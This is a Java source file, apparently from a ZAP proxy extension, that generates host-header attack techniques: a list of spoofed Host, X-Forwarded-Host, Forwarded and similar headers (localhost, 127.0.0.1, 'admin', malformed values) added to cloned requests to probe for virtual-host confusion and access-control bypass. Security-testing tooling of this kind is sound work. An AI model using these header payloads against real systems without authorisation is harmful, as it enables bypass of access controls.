package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

public class HostHeaderTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "Host Header"; }
    @Override public int getOrder() { return 45; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String lastSegHost = ctx.lastSeg.isEmpty() ? "localhost" : ctx.lastSeg;
        String[][] hostHeaders = {
            {"Host","localhost"},{"Host","127.0.0.1"},{"Host","127.0.0.1:443"},
            {"Host","target.local"},{"Host","localhost:443"},
            {"X-Original-Host","localhost"},{"X-Forwarded-Server","localhost"},
            {"X-Forwarded-Server","127.0.0.1"},{"X-Forwarded-Host","target.local"},
            {"X-Forwarded-Proto","http"},{"X-Forwarded-Proto","ws"},
            {"Forwarded","host=localhost"},{"Forwarded","for=127.0.0.1"},
            {"X-Forwarded-Port","443"},{"X-Url-Scheme","https"},
            {"Host","0.0.0.0"},{"Host","[::1]"},{"Host","localhost:80"},
            {"Host","127.0.0.1:8080"},{"Host","127.0.0.1:80"},
            {"X-Original-Host","admin"},{"X-Forwarded-Host","admin"},
            {"X-Proxy-Host","admin"},{"X-Rewrite-Host","admin"},
            {"Host",lastSegHost},
            {"X-Forwarded-Host","null"},{"X-Forwarded-Host",""},
            {"Host","a]"},{"Host","a@"},
            {"X-Host","127.0.0.1:443"},{"X-Host","localhost:8443"}
        };
        for (String[] pair : hostHeaders) {
            final String hn = pair[0], hv = pair[1];
            techs.add(new Technique("Host Header", "HostHdr:" + pair[0] + "=" + pair[1],
                "Host/vhost confusion: " + pair[0] + ": " + pair[1],
                base -> { HttpMessage c = cloneMsg(base); addHeader(c, hn, hv); return c; }));
        }
    }
}
